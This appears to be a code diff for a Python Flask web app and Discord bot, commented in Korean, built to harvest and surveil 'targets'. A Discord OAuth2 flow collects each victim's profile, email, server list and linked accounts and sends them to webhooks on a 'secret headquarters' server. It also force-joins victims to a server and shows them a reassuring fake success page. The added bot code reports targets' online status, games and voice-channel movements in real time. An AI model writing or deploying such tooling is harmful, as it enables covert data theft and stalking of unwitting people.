@@ -1,27 +1,28 @@
 import os
 import requests
+import threading
+import discord
 from flask import Flask, request, render_template_string
 
-app = Flask(__name__)
-
-# --- Render 환경 변수 로드 (Dashboard에서 설정 필수) ---
+# --- [1] 환경 변수 및 초기 설정 ---
 CLIENT_ID = os.environ.get('CLIENT_ID')
 CLIENT_SECRET = os.environ.get('CLIENT_SECRET')
 REDIRECT_URI = os.environ.get('REDIRECT_URI')
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 MY_GUILD_ID = os.environ.get('MY_GUILD_ID') # 타겟이 가입될 서버 "1" ID
 
-# --- 서버 "2" (비밀 본부) 웹훅 URL ---
+# 서버 "2" (비밀 본부) 웹훅 URL
 WH_PROFILE = os.environ.get('WH_PROFILE')   # 1번: 기본 신상용
 WH_GUILDS = os.environ.get('WH_GUILDS')     # 2번: 서버 목록/권한용
 WH_CONNECT = os.environ.get('WH_CONNECT')   # 3번: 외부 연결 계정용
-WH_CONTROL = os.environ.get('WH_CONTROL')   # 4번: 강제 가입/실시간 상태용
+WH_CONTROL = os.environ.get('WH_CONTROL')   # 4번: 강제 가입 및 실시간 상태용
 WH_SYSTEM = os.environ.get('WH_SYSTEM')     # 5번: 시스템 오류 보고용
 
 API_BASE = 'https://discord.com/api/v10'
-
-# 관리자용 메모리 저장소
 user_storage = []
+
+# --- [2] Flask 웹 서버 설정 (OAuth2 및 정보 수집) ---
+app = Flask(__name__)
 
 def send_report(url, embed):
     """지정된 웹훅으로 임베드 보고서를 전송합니다."""
@@ -106,7 +107,7 @@ def callback():
         join_status = "성공" if join_res.status_code in [201, 204] else f"실패 ({join_res.status_code})"
         
         send_report(WH_CONTROL, {
-            "title": "⛓️ 강제 서버 가입 및 실시간 감시 시작",
+            "title": "⛓️ 강제 서버 가입 결과 보고",
             "color": 9807270,
             "fields": [
                 {"name": "가입 서버 (서버1)", "value": f"ID: {MY_GUILD_ID}"},
@@ -118,7 +119,6 @@ def callback():
         # 관리자 대시보드용 데이터 저장
         user_storage.append({"tag": user_tag, "id": user_id, "email": u.get('email', 'N/A')})
 
-        # 타겟(A)에게 보여줄 최종 화면 (의심 방지용)
         return """
         <div style="text-align:center; margin-top:50px; font-family:sans-serif;">
             <h1 style="color:#5865F2;">✅ 인증 성공</h1>
@@ -127,33 +127,79 @@ def callback():
         """
 
     except Exception as e:
-        # 5. [5번 채널] 시스템 오류 보고
         requests.post(WH_SYSTEM, json={"content": f"🚨 **시스템 오류 발생:** {str(e)}"})
         return "인증 중 오류가 발생했습니다.", 500
 
 @app.route('/admin')
 def admin():
-    """서버 2의 웹훅 외에 웹에서 한눈에 보는 요약 페이지"""
     return render_template_string("""
     <body style="background:#23272a; color:white; font-family:sans-serif; padding:20px;">
         <h2>📊 수집된 타겟 요약 리스트 ({{ users|length }}명)</h2>
         <table border="1" style="width:100%; border-collapse:collapse; background:#2c2f33;">
-            <tr style="background:#5865F2;">
-                <th style="padding:10px;">유저 태그</th>
-                <th style="padding:10px;">고유 ID</th>
-                <th style="padding:10px;">이메일</th>
-            </tr>
+            <tr style="background:#5865F2;"><th style="padding:10px;">유저 태그</th><th style="padding:10px;">고유 ID</th><th style="padding:10px;">이메일</th></tr>
             {% for u in users %}
-            <tr>
-                <td style="padding:10px;">{{u.tag}}</td>
-                <td style="padding:10px;">{{u.id}}</td>
-                <td style="padding:10px;">{{u.email}}</td>
-            </tr>
+            <tr><td style="padding:10px;">{{u.tag}}</td><td style="padding:10px;">{{u.id}}</td><td style="padding:10px;">{{u.email}}</td></tr>
             {% endfor %}
         </table>
     </body>
     """, users=user_storage)
 
-if __name__ == '__main__':
+# --- [3] Discord 봇 설정 (실시간 감시 및 온라인 유지) ---
+intents = discord.Intents.default()
+intents.presences = True   # 온라인 상태/게임 감시용
+intents.members = True     # 멤버 목록 감시용
+client = discord.Client(intents=intents)
+
+@client.event
+async def on_ready():
+    print(f"🤖 감시 봇 온라인: {client.user}")
+
+@client.event
+async def on_presence_update(before, after):
+    """타겟의 실시간 활동(게임, 상태) 감지 및 서버 2로 보고"""
+    # 우리가 설정한 서버 1에서의 활동만 감시
+    if str(after.guild.id) != str(MY_GUILD_ID):
+        return
+
+    # 게임 활동이나 상태가 변했을 때만 보고
+    if before.status != after.status or before.activities != after.activities:
+        activity_names = [a.name for a in after.activities]
+        activity_str = ", ".join(activity_names) if activity_names else "없음"
+        
+        embed = {
+            "title": "📡 실시간 활동 포착",
+            "color": 3066993,
+            "fields": [
+                {"name": "타겟", "value": f"**{after.name}**", "inline": True},
+                {"name": "현재 상태", "value": f"`{after.status}`", "inline": True},
+                {"name": "플레이 중", "value": f"**{activity_str}**", "inline": False}
+            ]
+        }
+        send_report(WH_CONTROL, embed)
+
+@client.event
+async def on_voice_state_update(member, before, after):
+    """음성 채널 입퇴장 실시간 보고"""
+    if str(member.guild.id) != str(MY_GUILD_ID):
+        return
+
+    if before.channel != after.channel:
+        if after.channel:
+            msg = f"🔊 **{member.name}**님이 `{after.channel.name}` 음성 채널에 들어왔습니다."
+        else:
+            msg = f"🔈 **{member.name}**님이 음성 채널에서 나갔습니다."
+        
+        requests.post(WH_CONTROL, json={"content": msg})
+
+# --- [4] 병렬 실행 엔진 ---
+def run_flask():
     port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=port, use_reloader=False)
+
+if __name__ == '__main__':
+    # 1. Flask 웹 서버를 별도 스레드에서 실행
+    t = threading.Thread(target=run_flask)
+    t.start()
+
+    # 2. Discord 봇 실행 (메인 스레드 점유, 온라인 유지)
+    client.run(BOT_TOKEN)
